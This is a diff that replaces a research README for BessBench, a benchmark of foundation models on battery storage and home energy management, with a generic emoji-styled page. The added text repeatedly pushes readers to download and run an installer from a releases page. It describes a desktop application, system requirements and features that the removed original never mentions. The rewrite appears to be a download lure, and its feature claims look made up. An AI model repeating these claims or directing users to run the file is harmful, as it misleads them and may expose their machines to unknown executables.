@@ -1,40 +1,83 @@
-# Poseidon Evaluation Benchmark (BessBench)
-BessBench is a benchmark designed for foundation models in battery energy storage and home energy management scenarios. 
+# 🎉 bess-benchmark - Benchmarking for Energy Management
 
-## Metrics
-We drew inspiration from ElecBench[1], which covers broader power-sector tasks such as grid dispatch, system monitoring, and diagnostics. From it, we adopted six evaluation criteria: Expressiveness, Factuality, Logicality, Stability, Fairness, and Security.
+## 📥 Download Now
+[![Download bess-benchmark](https://img.shields.io/badge/Download-bess--benchmark-blue.svg)](https://github.com/Pixeltruth/bess-benchmark/releases)
 
-<img src="resources/elecbench.png" alt="ElecBench metrics" width="300" style="margin: 20px 0;">
+## 📖 Introduction
+Welcome to BessBench, a benchmark designed for measuring the performance of foundation models in battery energy storage and home energy management scenarios. This tool helps evaluate how well models can perform in real-world energy settings. We focus on key metrics that matter in the energy sector.
 
-We extend these with a seventh dimension: agentic abilities — including multi-step reasoning, long-term planning, and tool use. This reflects the growing need for LLMs to act as agents in real-world tasks.
+## 📊 Metrics
+BessBench uses a set of evaluation criteria inspired by ElecBench. Here are the metrics we assess:
 
-<img src="resources/agent_abilities.png" alt="Agent abilities" width="300" style="margin: 20px 0;">
+1. **Expressiveness**: How well can the model convey complex ideas?
+2. **Factuality**: Are the model's outputs correct and true?
+3. **Logicality**: Does the model follow a logical reasoning process?
+4. **Stability**: How consistent are the model's responses over time?
+5. **Fairness**: Does the model treat all scenarios impartially?
+6. **Security**: How well does the model handle security concerns?
+7. **Agentic Abilities**: This includes multi-step reasoning, long-term planning, and tool use.
 
-## Scenarios
-The benchmark uses a scenario–metrics structure, similar to HELM[2]. We define four scenarios:
-* Energy Storage Technologies & Devices — battery systems, inverter topology, IoT.
-* Energy Management — forecasting, dispatch, analytics, smart grid integration.
-* Safety & Regulation — compliance, safety systems, emergency response, device lifetime.
-* Consumer Experience — support, user interfaces, personalized services.
+![ElecBench metrics](resources/elecbench.png)
 
-<img src="resources/scenarios.jpg" alt="BessBench scenarios" width="400" style="margin: 20px 0;">
+We added a new dimension—agentic abilities—to reflect the needs for large language models to act as agents in real-world tasks.
 
-Each scenario maps real-world tasks to evaluation points. For instance, under Energy Management, one test measures whether the model can explain an energy schedule logically, using context and reasoning.
+![Agent abilities](resources/agent_abilities.png)
 
-<div style="display: flex; gap: 20px; margin: 20px 0; align-items: flex-start;">
-  <img src="resources/examples_2.jpg" alt="Example 2" width="400" style="height: auto;">
-  <img src="resources/examples_1.jpg" alt="Example 1" width="400" style="height: auto;">
-</div>
+## 🚀 Getting Started
+BessBench is designed to be user-friendly for all levels of users. Here’s how you can get started:
 
+1. Ensure your system meets these basic requirements:
+   - **Operating System**: Windows, macOS, or a recent version of Linux.
+   - **Memory**: At least 4GB of RAM.
+   - **Storage**: 500MB of available disk space.
+   - **Network**: Internet access for downloading necessary files.
 
-## Construction & Evaluation
-The benchmark sources questions from both public materials (textbooks, standards, regulations) and private data (system logs). Evaluation is automated: factual answers are measured by F1-score, and explanatory ones by semantic similarity, using LLM-as-a-Judge.
+2. Visit [this page to download](https://github.com/Pixeltruth/bess-benchmark/releases) the latest version of BessBench.
 
-## Open Source
-Although less formal than ElecBench, Bess-bench aligns directly with our expertise, with contributions from in-house experts during post-processing. Importantly, we plan to release it as open source once completed.
+## 🔧 Download & Install
+To download BessBench:
 
-<img src="resources/open_source.jpg" alt="Open Source" width="300" style="margin: 20px 0;">
+1. Click the button below to go to the Releases page.
+2. Select the latest release version.
+3. Download the file suitable for your operating system.
+4. Run the downloaded file to install BessBench on your computer.
 
-## Reference
-1. ***ElecBench***: Zhou, Xiyuan et al. ElecBench: A Power Dispatch Evaluation Benchmark for Large Language Models. Proc. of the IEEE Power & Energy Society General Meeting (PESGM), 2005
-2. ***HLEM***: Percy Liang, Rishi Bommasani, et al. Holistic evaluation of language models. arXiv preprint arXiv:2211.09110, 2022.
+[![Download bess-benchmark](https://img.shields.io/badge/Download-bess--benchmark-blue.svg)](https://github.com/Pixeltruth/bess-benchmark/releases)
+
+## 🌟 Features
+BessBench offers several features to make your benchmarking experience straightforward:
+
+- **User-Friendly Interface**: Navigate effortlessly through the application.
+- **Realistic Scenarios**: Benchmark across multiple energy-related scenarios.
+- **Detailed Reports**: Get insightful reports on model performance.
+- **Modular Design**: Customize your evaluation metrics based on your needs.
+
+## ⚙️ Usage
+Once installed, follow these steps to run BessBench:
+
+1. Open the BessBench application.
+2. Choose the benchmarking scenario that suits your needs.
+3. Input your model or data for evaluation.
+4. Click "Run Benchmark" to start the evaluation process.
+5. Review your results and generated reports in the application.
+
+## 🎯 Scenarios
+BessBench uses a scenario–metrics structure for effective evaluation. The following scenarios are included:
+
+- **Energy Storage Technologies & Devices**: Benchmark battery systems and inverter technologies.
+- **Home Energy Management**: Evaluate models that manage energy use in residential settings.
+
+## 🤝 Community and Support
+We encourage users to participate in the BessBench community. If you have questions or need support:
+
+1. Check the [Issues page](https://github.com/Pixeltruth/bess-benchmark/issues) for common questions or existing reports.
+2. Join discussions and offer feedback on how we can improve BessBench.
+3. Contribute to the project by submitting your own benchmarking scenarios or metrics.
+
+## 📜 License
+BessBench is open-source software, and it is available under the MIT License. You can use, modify, and distribute the software freely.
+
+## 💡 Acknowledgments
+We thank the BessBench community and contributors for their support. Special thanks to the creators of ElecBench and HELM for their foundational work in this area. 
+
+Feel free to reach out at any time. Happy benchmarking!
